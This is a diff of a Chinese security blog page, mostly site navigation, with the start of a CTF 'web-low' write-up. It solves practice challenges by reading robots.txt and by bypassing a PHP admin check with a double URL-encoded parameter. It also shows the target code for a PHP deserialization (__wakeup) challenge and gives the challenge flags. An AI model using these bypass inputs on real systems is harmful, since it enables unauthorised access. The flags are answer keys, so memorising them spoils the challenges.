+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8930de0c5beda9ae1324d8e974f81d1e" class="toggle" checked />
+    <label for="section-8930de0c5beda9ae1324d8e974f81d1e" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-755697504a2fe68087c290f83d929a6c" class="toggle"  />
+    <label for="section-755697504a2fe68087c290f83d929a6c" class="flex">
+      <a role="button" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/DVWA/" class="">
+      DVWA全难度</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-440df364fda34dee6eb8dbb8bf54c0be" class="toggle"  />
+    <label for="section-440df364fda34dee6eb8dbb8bf54c0be" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      Log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0a2f5b9129642a4909478fdeb2bc202e" class="toggle"  />
+    <label for="section-0a2f5b9129642a4909478fdeb2bc202e" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-503a003a1f0020ea9e857111fe72b746" class="toggle"  />
+    <label for="section-503a003a1f0020ea9e857111fe72b746" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fbe66aa168d91291660fa4890e0caf96" class="toggle"  />
+    <label for="section-fbe66aa168d91291660fa4890e0caf96" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-44d06050e861867b08816ac7b41bc098" class="toggle"  />
+    <label for="section-44d06050e861867b08816ac7b41bc098" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ccb82f673039402d87957a0215871d7" class="toggle" checked />
+    <label for="section-6ccb82f673039402d87957a0215871d7" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e0d169006dece34d6002b6d9d8f8c6d8" class="toggle" checked />
+    <label for="section-e0d169006dece34d6002b6d9d8f8c6d8" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="active">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6ecffae0aff6917133e7910d8ae47ce6" class="toggle"  />
+    <label for="section-6ecffae0aff6917133e7910d8ae47ce6" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-92481376b3688992fd4bd02f22611062" class="toggle"  />
+    <label for="section-92481376b3688992fd4bd02f22611062" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="toggle"  />
+    <label for="section-c4a8d9ea3b5e6163e868446590d1d1fc" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0322fd2da3e27f54e6647ac98dce6412" class="toggle"  />
+    <label for="section-0322fd2da3e27f54e6647ac98dce6412" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/kali-linux/" class="">
+      kali linux基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-46cca3cee31003e60d06ca1be37ae652" class="toggle"  />
+    <label for="section-46cca3cee31003e60d06ca1be37ae652" class="flex">
+      <a href="/docs/navigation/" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E9%9D%B6%E5%9C%BA/" class="">
+      靶场</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
+      平台</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>web-low</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一低难度">一、低难度</a>
+      <ul>
+        <li><a href="#11-training-www-robotsrobots">1.1 Training-WWW-Robots（Robots）</a></li>
+        <li><a href="#12-php2indexphps">1.2 PHP2（index.phps）</a></li>
+        <li><a href="#13-unserialize3反序列化漏洞">1.3 unserialize3（反序列化漏洞）</a></li>
+        <li><a href="#14-ics-06字典爆破">1.4 ics-06（字典爆破）</a></li>
+        <li><a href="#15-get_postgetpost">1.5 get_post（GET/POST）</a></li>
+        <li><a href="#16-backup目录扫描">1.6 backup（目录扫描）</a></li>
+        <li><a href="#17-cookie">1.7 cookie</a></li>
+        <li><a href="#18-disabled_buttonhtml源码修改">1.8 disabled_button（HTML源码修改）</a></li>
+        <li><a href="#19-weak_auth字典爆破">1.9 weak_auth（字典爆破）</a></li>
+        <li><a href="#110-simple_phpphp源码审计">1.10 simple_php（php源码审计）</a></li>
+        <li><a href="#111-baby_web重定向">1.11 baby_web(重定向)</a></li>
+        <li><a href="#112-ingetsql注入">1.12 inget(sql注入)</a></li>
+        <li><a href="#113-easyupload文件上传">1.13 easyupload(文件上传)</a>
+          <ul>
+            <li><a href="#1131-一般思路">1.13.1 一般思路</a></li>
+            <li><a href="#1132-userini思路">1.13.2 <code>.user.ini</code>思路</a></li>
+          </ul>
+        </li>
+        <li><a href="#114-file-include文件包含伪协议">1.14 file include(文件包含伪协议)</a>
+          <ul>
+            <li><a href="#1141-源码分析">1.14.1 源码分析</a></li>
+            <li><a href="#1142-php的filter伪协议">1.14.2 PHP的<code>filter</code>伪协议</a></li>
+          </ul>
+        </li>
+        <li><a href="#115-fileclude文件包含伪协议">1.15 fileclude(文件包含伪协议)</a></li>
+        <li><a href="#116-easyphp">1.16 easyphp</a></li>
+        <li><a href="#117-file_includephp本地包含lfi漏洞">1.17 file_include（php本地包含LFI漏洞）</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一低难度">一、低难度<a class="anchor" href="#%e4%b8%80%e4%bd%8e%e9%9a%be%e5%ba%a6">#</a></h1>
+<h2 id="11-training-www-robotsrobots">1.1 Training-WWW-Robots（Robots）<a class="anchor" href="#11-training-www-robotsrobots">#</a></h2>
+<p>考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(<code>/robots.txt</code>)
 题目还讲述，这些文件也揭示了目录结构
-直接URL拼接<code>/robots.txt</code>，获得如下信息：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>User-agent: *
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>Disallow: /fl0g.php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>User-agent: Yandex
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>Disallow: *</span></span></code></pre></div><p>URL再拼接<code>/robots.txt</code>，获得flag<code>cyberpeace{40f29ee385120426536014952e9cb9f3}</code></p><h2 id=12-php2indexphps>1.2 PHP2（index.phps）<a class=anchor href=#12-php2indexphps>#</a></h2><p>URL拼接<code>index.phps</code>后缀来查看<code>php</code>源代码</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span><span style=color:#ff7b72>if</span>(<span style=color:#a5d6ff>&#34;admin&#34;</span><span style=color:#ff7b72;font-weight:700>===</span><span style=color:#79c0ff>$_GET</span>[id]) {
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>  <span style=color:#ff7b72>echo</span>(<span style=color:#a5d6ff>&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>  <span style=color:#ff7b72>exit</span>();
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span><span style=color:#79c0ff>$_GET</span>[id] <span style=color:#ff7b72;font-weight:700>=</span> urldecode(<span style=color:#79c0ff>$_GET</span>[id]);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span><span style=color:#ff7b72>if</span>(<span style=color:#79c0ff>$_GET</span>[id] <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>&#34;admin&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>  <span style=color:#ff7b72>echo</span> <span style=color:#a5d6ff>&#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>  <span style=color:#ff7b72>echo</span> <span style=color:#a5d6ff>&#34;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&#34;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149>
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span><span style=color:#f85149>
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span><span style=color:#f85149>Can you anthenticate to this website?
+直接URL拼接<code>/robots.txt</code>，获得如下信息：</p>
+<pre tabindex="0"><code>User-agent: *
+Disallow: /fl0g.php
+
+User-agent: Yandex
+Disallow: *</code></pre><p>URL再拼接<code>/robots.txt</code>，获得flag<code>cyberpeace{40f29ee385120426536014952e9cb9f3}</code></p>
+<h2 id="12-php2indexphps">1.2 PHP2（index.phps）<a class="anchor" href="#12-php2indexphps">#</a></h2>
+<p>URL拼接<code>index.phps</code>后缀来查看<code>php</code>源代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#5af78e">&#34;admin&#34;</span><span style="color:#ff6ac1">===</span><span style="color:#ff5c57">$_GET</span>[id]) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">echo</span>(<span style="color:#5af78e">&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$_GET</span>[id] <span style="color:#ff6ac1">=</span> urldecode(<span style="color:#ff5c57">$_GET</span>[id]);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$_GET</span>[id] <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;admin&#34;</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">Can you anthenticate to this website?
 </span></span></span></code></pre></div><p>如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key
 这里采用burpsuite的编码器直接对admin进行url解码，<code>admin</code> → <code>%61%64%6d%69%6e</code>
 URL后缀加入<code>/?id=%61%64%6d%69%6e</code>，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ <code>%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code>
-成功获得flag<code>cyberpeace{6493a95c8814ca178d91560aed4993d2}</code></p><h2 id=13-unserialize3反序列化漏洞>1.3 unserialize3（反序列化漏洞）<a class=anchor href=#13-unserialize3%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span><span style=color:#ff7b72>class</span> <span style=color:#f0883e;font-weight:700>xctf</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span><span style=color:#ff7b72>public</span> <span style=color:#79c0ff>$flag</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;111&#39;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span><span style=color:#ff7b72>public</span> <span style=color:#ff7b72>function</span> <span style=color:#d2a8ff;font-weight:700>__wakeup</span>(){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span><span style=color:#ff7b72>exit</span>(<span style=color:#a5d6ff>&#39;bad requests&#39;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span><span style=color:#ff7b72;font-weight:700>?</span>code<span style=color:#ff7b72;font-weight:700>=</span></span></span></code></pre></div><p>PHP反序列化漏洞场景(CVE-2016-7124)，分析</p><ul><li><code>$flag = '111';</code>是类中的一个属性</li><li><code>function __wakeup()</code>是魔术方法，<code>unserialize()</code>反序列化函数会检查是否存在<code>__wakeup</code>方法，如果存在，则会先调用<code>__wakeup</code>方法</li><li><code>exit('bad requests');</code>这里的<code>__wakeup</code>起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行</li><li>目前的代码无序列化函数(即：<code>serialize()</code>函数，能将内存中的对象转为文本，触发魔术方法：<code>__sleep()</code>如果存在)，所以传递参数的时候需要<strong>自己传递已经序列化的参数</strong>，题目提示，传参给code</li></ul><p>打开phpstudy，安装<code>php5.4.45nts</code>，localhost网站选择这个php版本，接着在<code>/WWW</code>目录下创建<code>serialize.php</code>文件，内容如下：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span><span style=color:#ff7b72>class</span> <span style=color:#f0883e;font-weight:700>xctf</span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>    <span style=color:#ff7b72>public</span> <span style=color:#79c0ff>$flag</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;111&#39;</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>    <span style=color:#ff7b72>public</span> <span style=color:#ff7b72>function</span> <span style=color:#d2a8ff;font-weight:700>__wakeup</span>(){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>        <span style=color:#ff7b72>exit</span>(<span style=color:#a5d6ff>&#39;bad requests&#39;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span><span style=color:#79c0ff>$x</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72>new</span> xctf(); <span style=color:#8b949e;font-style:italic>// 创建新对象（实例化）
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span><span style=color:#ff7b72>echo</span>(serialize(<span style=color:#79c0ff>$x</span>)); <span style=color:#8b949e;font-style:italic>// 对对象序列化输出
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149>
+成功获得flag<code>cyberpeace{6493a95c8814ca178d91560aed4993d2}</code></p>
+<h2 id="13-unserialize3反序列化漏洞">1.3 unserialize3（反序列化漏洞）<a class="anchor" href="#13-unserialize3%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e">#</a></h2>
